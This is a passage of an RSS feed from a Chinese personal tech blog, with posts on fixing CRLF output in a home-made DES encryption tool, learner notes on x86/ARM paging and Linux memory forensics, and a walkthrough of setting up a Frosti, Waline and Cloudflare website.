Usage: ./DES [-e | -d] -k &amp;lt;key&amp;gt; [-x &amp;lt;hex&amp;gt; | -m &amp;lt;message&amp;gt; | -f &amp;lt;file&amp;gt;] [-o &amp;lt;output&amp;gt;] [-h] [-v]
Options:
  -e            Encrypt the input (message, file or 64-bit hex number).
  -d            Decrypt the input (message, file or 64-bit hex number).
  -k &amp;lt;key&amp;gt;      Specify the encryption/decryption key (required).      
  -x &amp;lt;hex&amp;gt;      Specify the hex number to encrypt or decrypt.
  -m &amp;lt;message&amp;gt;  Specify the message to encrypt or decrypt.
  -f &amp;lt;file&amp;gt;     Specify the file to encrypt or decrypt.
  -o &amp;lt;output&amp;gt;   Specify the output file for encrypted/decrypted data, default STDOUT.
  -h            Display this help message.
  -v            Enable verbose mode for detailed output.

Examples:
  ./DES -e -k 0x12345678 -x 0x789abc -v
  ./DES -e -k 0x12345678 -m &amp;quot;Hello, World!&amp;quot;
  ./DES -e -k 0x12345678 -f input.txt -o encrypted_file.txt
  ./DES -d -k 0x12345678 -f encrypted_file.txt -o decrypted_file.txt   
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但还有一关:换行符格式&lt;/p&gt;
&lt;p&gt;我们知道,Windows文本使用CRLF(即\r\n)来换行,而在C语言中&lt;code&gt;printf(&amp;quot;\n&amp;quot;)&lt;/code&gt;即可换行,这是因为Windows下自动给C的标准输出流的&lt;code&gt;\n&lt;/code&gt;替换为&lt;code&gt;\r\n&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;这会带来一个什么问题呢?当我把一个CRLF文件加密,密文里面隐藏了&lt;code&gt;\r\n&lt;/code&gt;,而当我输出解密后的明文时,Windows下的C会将&lt;code&gt;\n&lt;/code&gt;替换为&lt;code&gt;\r\n&lt;/code&gt;,于是就变成了&lt;code&gt;\r\n\n&lt;/code&gt;,换了两行.&lt;/p&gt;
&lt;p&gt;我发现这个现象,不仅仅是文本文件会发生,所有fprintf(stdout)都会执行不分青红皂白的替换,只要它遇到&lt;code&gt;\n&lt;/code&gt;(好像是0x0a)这个字节,自动替换为0x0d0a,这就导致了大多数时候经过加密解密后md5校验和不一致.&lt;/p&gt;
&lt;p&gt;我问Github Copilot,它给我的解决方法是:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef _WIN32
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;io.h&amp;gt;
#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以及&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main(int argc, char *argv[]) {
#ifdef _WIN32
	_setmode(_fileno(stdout), _O_BINARY);
#endif
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样,就不会自动修改为CRLF.&lt;/p&gt;
&lt;p&gt;目前为止,输出重定向用的是终端中的 &lt;code&gt;&amp;gt;&lt;/code&gt;,比如:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./DES -d -k 0x999 -f &amp;quot;encrypted_file&amp;quot; &amp;gt; &amp;quot;decrypted_file&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在cmd中确实没问题了,但是一旦在Powshell中运行又不行了.&lt;/p&gt;
&lt;p&gt;Github Copilot教我这样检查文件的内容:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Get-Content -Path &amp;quot;yourfile.txt&amp;quot; -Raw | Format-Hex
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我发现相较于cmd的输出,Powershell的输出在文件末尾多了&lt;code&gt;0x0D0A&lt;/code&gt;,正是&lt;code&gt;\r\n&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;诶,我不是明明已经针对这种行为加入了那个奇怪的&lt;code&gt;_setmode&lt;/code&gt;函数吗?而且cmd中是正确的.&lt;/p&gt;
&lt;p&gt;Copilot又告诉我,这已经不是Windows下C的行为了,而是Powershell自己的行为.它将&lt;code&gt;&amp;gt;&lt;/code&gt;重定向默认当作是文本文件,并且在最后加上&lt;code&gt;\r\n&lt;/code&gt;来转换为Windows的CRLF文本文件格式.&lt;/p&gt;
&lt;p&gt;哎,真是拿你没办法呢.为了兼容性,我干脆增加了一个output选项,这就是最终版.&lt;/p&gt;
&lt;h2&gt;程序测试&lt;/h2&gt;
&lt;p&gt;文件经过加密和解密,MD5校验和与原文件一致,说明程序执行逻辑正确!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;PS &amp;gt; .\DES.exe -e -k 0x999 -f DES.exe -o encrypted
PS &amp;gt; .\DES.exe -d -k 0x999 -f encrypted -o decrypted
PS &amp;gt; md5sum .\DES.exe
\0319c765a2e54d3dc02520e11b2f3145 *.\\DES.exe
PS &amp;gt; md5sum .\decrypted
\0319c765a2e54d3dc02520e11b2f3145 *.\\decrypted
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 10 Apr 2025 16:00:00 GMT</pubDate></item><item><title>内存取证基础知识</title><link>https://tankimzeg.top/blog/memory-forensics/memory-forensics-basic/</link><guid isPermaLink="true">https://tankimzeg.top/blog/memory-forensics/memory-forensics-basic/</guid><description>本章简单介绍了进行内存取证所需的软硬件知识</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/memory-forensics/memory-forensics-basic/&quot;&gt;https://tankimzeg.top/blog/memory-forensics/memory-forensics-basic/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;基于在CS:APP中学习的内存相关知识,我开启了内存取证的新坑...🤓&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743240039415.png&quot; alt=&quot;PC硬件架构&quot;&gt;&lt;/p&gt;
&lt;h2&gt;中央处理器和内存管理单元&lt;/h2&gt;
&lt;h3&gt;寄存器&lt;/h3&gt;
&lt;p&gt;CPU中与内存相关的寄存器:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;EIP寄存器: 存放下一条指令的地址&lt;/li&gt;
&lt;li&gt;IA32_EFER MSR&lt;/li&gt;
&lt;li&gt;控制寄存器&lt;ul&gt;
&lt;li&gt;CR0:含有控制处理器工作模式和状态的控制标志&lt;/li&gt;
&lt;li&gt;CR1: 保留未用&lt;/li&gt;
&lt;li&gt;CR2: 含有页错误的线性地址&lt;/li&gt;
&lt;li&gt;CR3: 含有地址转换的初始结构.该结构含有页目录物理内存基地址&lt;/li&gt;
&lt;li&gt;CR4: 标志使用架构的拓展功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;🥱&lt;/p&gt;
&lt;h3&gt;南北桥芯片&lt;/h3&gt;
&lt;h3&gt;直接存储器访问(Direct Media Access:DMA)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;现代设备不是基本不用了吗...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;内存&lt;/h3&gt;
&lt;p&gt;动态随机存储器(DRAM),无需多言&lt;/p&gt;
&lt;h2&gt;内存管理&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;具体细节参考英特尔技术手册&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;IA-32(32 bits) 和 Intel 64( 64 bits)架构的处理器&lt;/p&gt;
&lt;p&gt;32 bits允许程序拥有$2^{32}$比特即4GB大小的物理内存.通过物理地址拓展最多支持64GB&lt;/p&gt;
&lt;p&gt;IA-32提供实模式(实地址)和保护模式(虚地址)两种工作模式,现代的设备基本都用保护模式呀.&lt;/p&gt;
&lt;p&gt;IA-32架构处理器的内存管理功能分成两部分:分段和分页:
&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743240893658.png&quot; alt=&quot;分段和分页&quot;&gt;&lt;/p&gt;
&lt;h3&gt;分段&lt;/h3&gt;
&lt;p&gt;分段提供了一种隔离机制，将不同代码、数据和栈模块隔离开来，使运行在同一处理器上的多个程序（或者任务）互不干扰.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我的理解是,这是每个进程的上下文,相互独立.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;分页&lt;/h3&gt;
&lt;p&gt;分页机制为请求分页（Demand Paging）、虚拟内存系统提供支持，当程序执行环境的部分需要时，将其映射到物理内存。分页也可以用来隔离多个任务空间。&lt;/p&gt;
&lt;p&gt;当CPU中的寄存器CR0的分页标志位为0时（CR0.PG = 0），不使用分页机制，处理器将线性地址直接视为物理地址。&lt;/p&gt;
&lt;p&gt;当CPU中的寄存器CR0的分页标志位为1（CR0.PG = 1），并且处于保护模式时（CR0.PE = 1），处理器使用分页模式。根据寄存器CR4的标志位CR4.PAE和IA32_EFER寄存器的标志位IA32_EFER的值，决定采用何种分页模式。&lt;/p&gt;
&lt;p&gt;目前，Intel处理器的分页模式有3种：32 bit分页模式（32-bit Paging）、PA E分页（PA E Paging）和四级分页（4-Level Paging，曾用术语IA-32e分页）。&lt;/p&gt;
&lt;h2&gt;地址转换&lt;/h2&gt;
&lt;p&gt;实现从虚拟地址到物理地址的翻译的过程就是地址转换.&lt;/p&gt;
&lt;h3&gt;32bit分页&lt;/h3&gt;
&lt;p&gt;32 bit分页的页大小有两种情况：4 kB和4 MB。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743241236589.png&quot; alt=&quot;页大小为4kB的地址转换&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743241287956.png&quot; alt=&quot;页大小为4MB的地址转换&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;每次看页表,都有一种既熟悉又被绕晕的感觉🥱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;物理地址拓展分页(PAE)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;意思是拓展了页目录和页表项,从32bits 到 64 bits,但是32位处理器哪来64位的地址?不是很懂emm&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743241670906.png&quot; alt=&quot;页大小4kB的PAE&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743241712781.png&quot; alt=&quot;页大小2MB的PAE&quot;&gt;&lt;/p&gt;
&lt;h3&gt;64bit分页&lt;/h3&gt;
&lt;p&gt;Intel 64-bit 架构处理器采用四级分页&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743241816075.png&quot; alt=&quot;四级分页下页大小4kB的地址转换&quot;&gt;&lt;/p&gt;
&lt;h2&gt;ARM架构&lt;/h2&gt;
&lt;p&gt;移动通讯领域如手机大多使用了ARM处理器.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;操作系统方面，ARM系统大部分采用了基于Linux内核的操作系统，而且几乎所有的硬件系统都需要单独构建自己的系统，以致于与其他系统不能兼容，应用软件不能方便移植，这一直制约了ARM系统的发展和应用。Google开发了Android系统并开放后，使基于ARM架构的系统有了统一、开放、免费的操作系统，为ARM的发展提供了强大的支持和动力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ARM MMU硬件也是通过页表机制将虚拟地址翻译成对应物理地址的，处理器通过查找页表中的描述符来获取虚拟地址对应的物理地址.&lt;/p&gt;
&lt;p&gt;ARM MMU使用两级页表结构:(L1 和L2)
有两种类型的L2页表,分别是L2粗页表和L2细页表 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743242081610.png&quot; alt=&quot;页表地址格式&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1743242114066.png&quot; alt=&quot;L1主页表和L2粗页表的地址转换&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 28 Mar 2025 16:00:00 GMT</pubDate></item><item><title>Linux操作系统内存分析原理</title><link>https://tankimzeg.top/blog/memory-forensics/linux-memory-analysis-principles/</link><guid isPermaLink="true">https://tankimzeg.top/blog/memory-forensics/linux-memory-analysis-principles/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/memory-forensics/linux-memory-analysis-principles/&quot;&gt;https://tankimzeg.top/blog/memory-forensics/linux-memory-analysis-principles/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;Linux操作系统关键组件&lt;/h2&gt;
&lt;h3&gt;Linux内存管理&lt;/h3&gt;
&lt;p&gt;内核对一致(UMA)和非一致内存访问系统(NUMA)使用相同的数据结构.&lt;/p&gt;
&lt;p&gt;内存划分为节点,每个节点关联到系统中的一个处理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Linux%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86-1743254735898.png&quot; alt=&quot;NUMA内存架构&quot;&gt;
(NUMA内存架构)&lt;/p&gt;
&lt;h3&gt;Linux地址转换&lt;/h3&gt;
&lt;p&gt;前面第二章我们提到了,虚拟地址到物理地址依赖于地址转换.以四级页表为例,虚拟地址分为5个部分:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PGD&lt;/li&gt;
&lt;li&gt;PUD&lt;/li&gt;
&lt;li&gt;PMD&lt;/li&gt;
&lt;li&gt;PTE&lt;/li&gt;
&lt;li&gt;OFFSET&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Linux%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86-1743255080531.png&quot; alt=&quot;虚拟内存地址分解&quot;&gt;&lt;/p&gt;
&lt;p&gt;各级页目录/页表所能存储的指针数目，可以通过宏定义确定。&lt;/p&gt;
&lt;p&gt;PTRS_PER_PTE、PTRS_PER_PMD、PTRS_PER_PUD、PTRS_PER_PGD分别对应页目录项、页中间目录、页上层目录、页全局目录中项的个数。两级页表的体系结构会将PTRS_PER_PMD和PTRS_PER_PUD定义为1。&lt;/p&gt;
&lt;p&gt;在对Linux内存分析时,就需要将虚拟地址转换为物理地址.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;内核空间的地址转换
  正如我在&lt;a href=&quot;https://tankimzeg.top/blog/%E9%93%BE%E6%8E%A5&quot;&gt;链接&lt;/a&gt;过程中学过的,程序有链接过程中需要一个&lt;strong&gt;符号表&lt;/strong&gt;,保存着符号与虚拟地址的对应关系,内核的符号也有与虚拟地址的对应关系,这个文件在内核编译时产生,大多位于/boot/System.map.&lt;/p&gt;
&lt;p&gt;  在32位系统,内核符号swapper_pg_dir的值就是目录表基址DTB的值;在64位系统,内核符号init_level4_pgt的值就是DTB.&lt;/p&gt;
&lt;p&gt;  在32 bit系统下，将DTB的虚拟地址减去0xc0000000即可获取到DTB的物理地址；在64 bit系统下，将DTB的虚拟地址减去0xffffffff80000000即可获取到DTB的物理地址.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;进程空间的地址转换
对于进程空间地址转换的问题,需要获取目标进程页目录指针的值.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内核维护着进程相关的结构体,进程页目录指针的值可以通过
task_struct -&amp;gt; mm -&amp;gt; pgd
获取到&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Linux%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86-1743255993079.png&quot; alt=&quot;task_struct和mm_struct结构体关系&quot;&gt;&lt;/p&gt;
&lt;h3&gt;系统内核符号表&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;cat /proc/kallsyms | tail -n +0 | head -n 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以查看当前环境下导出的内核符号&lt;/p&gt;
&lt;p&gt;中间的字母表示符号表类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;B:该符号来自未初始化bss段&lt;/li&gt;
&lt;li&gt;D:该符号位于初始化数据段&lt;/li&gt;
&lt;li&gt;G:初始化数据段,专门对应小的数据对象&lt;/li&gt;
&lt;li&gt;I:其他符号的间接引用&lt;/li&gt;
&lt;li&gt;N:调试符号&lt;/li&gt;
&lt;li&gt;R:只读代码段符号&lt;/li&gt;
&lt;li&gt;S:BSS段符号&lt;/li&gt;
&lt;li&gt;T:代码段符号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内核符号表可以通过以下方式获取:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;复制/proc/kallsysms或者System.map
 System.map包含了内核映像中的符号表，由./scripts/kallsyms.c在编译内核时生成；/proc/kallsyms则包含kernel image和所有动态加载模块的符号表，由./kernel/kallsyms.c在内核启动时生成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;内核将System.map内容置于内核可执行文件中，可以通过以下命令提取出来&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./scripts/extract-vmlinux/tmp/vmlinuz-3.13.0-63-generic &amp;gt;/tmp/vmlinuz-3.13.0-63-generic.elf 
readelf -Wa /tmp/vmlinuz-3.13.0-63-generic.elf 
objcopy -j ksymtab_strings -O binary /tmp/vmlinuz-3.13.0-63-generic.elf vmlinux.bin- ksymtab_strings
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ELF可执行可链接文件格式&lt;/h2&gt;
&lt;p&gt;在&lt;a href=&quot;https://www.tankimzeg.top/blog/%E9%93%BE%E6%8E%A5&quot;&gt;链接&lt;/a&gt;中,我已经学过链接过程.&lt;/p&gt;
&lt;p&gt;ELF文件有以下三种类型:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可重定位文件: 包含代码和数据&lt;/li&gt;
&lt;li&gt;可执行文件&lt;/li&gt;
&lt;li&gt;共享目标文件(.so)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可通过 &lt;code&gt;readelf&lt;/code&gt; 分析和查看ELF文件结构:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;readelf -h /usr/bin/ps
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/_astro/Pasted%20image%2020250201113741.DIf2uyfS_16lXPT.webp&quot; alt=&quot;ELF文件构成&quot;&gt;&lt;/p&gt;
&lt;h3&gt;ELF header&lt;/h3&gt;
&lt;p&gt;除了用于标识ELF文件的几个字节外，ELF文件头还包含了文件类型和大小的有关信息，以及文件加载后程序执行的入口点信息。&lt;/p&gt;
&lt;h3&gt;Segment header table&lt;/h3&gt;
&lt;p&gt;向系统提供了 &lt;strong&gt;可执行文件&lt;/strong&gt; 的数据在进程虚拟地址空间中的组织方式的相关信息,还表示了文件可能包含的段数目/段的位置和用途.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;readelf -l /eusr/bin/ps
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看段头部表.&lt;/p&gt;
&lt;h3&gt;Section&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;readelf -S /usr/bin/ps
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Section header table&lt;/h3&gt;
&lt;p&gt;节头部表包含了各节相关的附加信息&lt;/p&gt;
&lt;h2&gt;Volatility物理内存分析方法&lt;/h2&gt;
&lt;p&gt;Volatility是使用Python语言编写的GNU内存取证工具集,需要向程序传递正确的操作系统详细版本信息,并需要System.map内核符号表文件.&lt;/p&gt;
&lt;p&gt;在只给定一个物理内存镜像文件的情况下，无法进行物理内存分析处理。或者已知操作系统版本但是没有对应的System.map符号表文件，如在使用硬件方式获取物理内存时，只能获取到物理内存信息，无法获取System.map符号表文件，这种情况下也无法进行物理内存分析操作。&lt;/p&gt;
&lt;h2&gt;不依赖内核符号表的Linux物理内存分析方法&lt;/h2&gt;
&lt;p&gt;在对内核态进行地址翻译时,最需要的是页目录.&lt;/p&gt;
&lt;p&gt;内核变量 &lt;code&gt;swapper_pg_dir&lt;/code&gt; 存放了页目录的 &lt;strong&gt;虚拟地址&lt;/strong&gt;.
获取这个值应该还是有很多方法的.
&lt;a href=&quot;https://zhuanlan.zhihu.com/p/146477822&quot;&gt;linux内核中内核态虚拟地址和物理地址之间转换原理分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;kallsyms则是(运行时)内核符号表?&lt;/p&gt;
&lt;p&gt;kallsyms抽取了内核用到的所有函数地址(全局的、静态的)和非栈数据变量地址，生成一个数据块，作为只读数据链接进kernel image，相当于内核中存了一个System.map&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;感觉需要深入理解Linux内核,现在对我来说太晦涩了😵‍💫&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 28 Mar 2025 16:00:00 GMT</pubDate></item><item><title>Frosti+Nginx+Waline建站全过程</title><link>https://tankimzeg.top/blog/frosti-nginx-waline-build-website/</link><guid isPermaLink="true">https://tankimzeg.top/blog/frosti-nginx-waline-build-website/</guid><description>本博客网站的建立过程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/frosti-nginx-waline-build-website/&quot;&gt;https://tankimzeg.top/blog/frosti-nginx-waline-build-website/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;用了几天时间,我的网站终于建设好了!&lt;/p&gt;
&lt;p&gt;我使用Astro的Frosti模板,Nginx反代实现docker独立部署Waline.为了实现反代购买了一个域名,将原来用IP地址访问绑定到域名,并使用HTTPS协议提升安全性.&lt;/p&gt;
&lt;p&gt;数据库使用远程Azure flexible MySQL.&lt;/p&gt;
&lt;h1&gt;购买域名并托管到Cloudflare&lt;/h1&gt;
&lt;p&gt;在&lt;a href=&quot;https://www.spaceship.com&quot;&gt;Spaceship&lt;/a&gt;上购买一个域名,支持支付宝付款,具体bilibili上有视频展示过程.&lt;/p&gt;
&lt;p&gt;将域名托管到&lt;a href=&quot;https://dash.cloudflare.com&quot;&gt;Cloudflare&lt;/a&gt;上:
(具体看别的教程吧,这里我凭印象说一下)
先登录自己的邮箱账号,然后点Overview,输入自己的域名(注意这时候是不含www这类二级域名的)然后(我记得有一步选择套餐,不记得先后顺序了,那里选择$0免费的.)Cloudflare会对域名进行DNS解析,这时候,由于域名之前由Spaceship持有,所以这里会出现几条记录,IPv4和IPv6可能都有,先删掉,之后要解析成自己的IP地址嘛.最后出现两个CF的DNS服务器,复制后,在Spaceship中找到自己的购买的域名&lt;a href=&quot;https://www.spaceship.com/application/domain-list-application/&quot;&gt;Domain Manager App - Spaceship&lt;/a&gt;,
&lt;img src=&quot;https://tankimzeg.top/attachments/Build-Website-Spaceship.png&quot; alt=&quot;Spaceship Dashboard&quot;&gt;
填写到Nameservers里面去,设置为Custom nameservers
&lt;img src=&quot;https://tankimzeg.top/attachments/Build-Website-Custom-NS.png&quot; alt=&quot;Custom nameservers&quot;&gt;&lt;/p&gt;
&lt;p&gt;回到Cloudflare,在左侧导航栏中点击DNS -&amp;gt; Records,当你的域名显示绿色的Activate之后,可以管理DNS Records.把无关的DNS记录删掉,然后添加A记录.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;A 记录（将域名指向服务器 IP）&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;名称&lt;/strong&gt;：&lt;code&gt;@&lt;/code&gt;（表示主域名，如 &lt;code&gt;example.com&lt;/code&gt;）或 &lt;code&gt;www&lt;/code&gt;（表示 &lt;code&gt;www.example.com&lt;/code&gt;）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;IPv4 地址&lt;/strong&gt;：您的服务器 IP 地址（如 &lt;code&gt;123.45.67.89&lt;/code&gt;）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Proxy status&lt;/strong&gt;：选择 &lt;strong&gt;Proxied&lt;/strong&gt;（橙色云图标），以通过 Cloudflare 的 CDN 和安全服务。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;我注意到还有其他类型的记录,如AAAA对应的是IPv6地址,NS是自己服务器上的DNS服务,这些我暂时都用不上.其实子域名如blog.example.com应该是可以用CNAME的,不过我没用.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;保存后,过几分钟,在以下网站搜索自己的域名就能看到A记录的变化.由于世界各地的DNS服务器都有各自的缓存,可能还留有旧纪录.由于我们选择了CF的Proxy服务,所以看不到自己服务器的真实IP,不用担心是自己设置错了.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.itdog.cn/dns/&quot;&gt;查看国内DNS解析情况&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dnschecker.org/&quot;&gt;查看全球DNS解析情况&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以在终端输入nslookup(for Windows)或nslookup/dig(for Linux)查看自己所在网络的域名解析结果:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nslookup example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;dig example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;在Frosti中启用Waline&lt;/h1&gt;
&lt;p&gt;原作者默认关闭了这个功能,我们可以手动启用.
浏览项目结构,打开src/pages/blog/[...slug].astro文件,找到如下代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;  &amp;lt;BaseCard
    title={post.data.title}
    image={post.data.image}
    pubDate={post.data.pubDate}
    badge={post.data.badge}
    categories={post.data.categories}
    tags={post.data.tags}
    word={remarkPluginFrontmatter.totalCharCount}
    time={remarkPluginFrontmatter.readingTime}
    isBlog=&amp;quot;true&amp;quot;
  &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;添加一行&lt;code&gt;comment=&amp;quot;true&amp;quot;&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;  &amp;lt;BaseCard
    title={post.data.title}
    image={post.data.image}
    pubDate={post.data.pubDate}
    badge={post.data.badge}
    categories={post.data.categories}
    tags={post.data.tags}
    word={remarkPluginFrontmatter.totalCharCount}
    time={remarkPluginFrontmatter.readingTime}
    isBlog=&amp;quot;true&amp;quot;
    comment=&amp;quot;true&amp;quot;
  &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后在 src/consts.ts文件修改SERVER_URL,例如 &lt;a href=&quot;http://waline.example.com&quot;&gt;http://waline.example.com&lt;/a&gt;
,我们暂时还没有这个网站,要往CF里添加这一条记录.&lt;/p&gt;
&lt;h2&gt;部署Waline&lt;/h2&gt;
&lt;p&gt;来到&lt;a href=&quot;https://waline.js.org/guide/&quot;&gt;waline&lt;/a&gt;文档,我们可以选择适合自己的方式部署.别的那些线上部署我不熟悉,看起来也挺麻烦的,我选择的是非常原始但我熟悉的Docker + MySQL&lt;/p&gt;
&lt;p&gt;这里我参考了&lt;a href=&quot;https://bg3lnt.xyz/posts/dc23e930.html&quot;&gt;使用docker独立部署MySQL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不过我有远程的MySQL服务器(得感谢Github学生包啊,美美享用微软的Azure服务器)&lt;/p&gt;
&lt;p&gt;我先连接我的数据库(这里用的是Navicat,没用的话也可以用命令行去连接),然后新建一个数据库&lt;code&gt;waline&lt;/code&gt;,右键&amp;quot;运行SQL文件:
&lt;img src=&quot;https://tankimzeg.top/attachments/Build-Website-Run-SQL.png&quot; alt=&quot;Run SQL&quot;&gt;&lt;/p&gt;
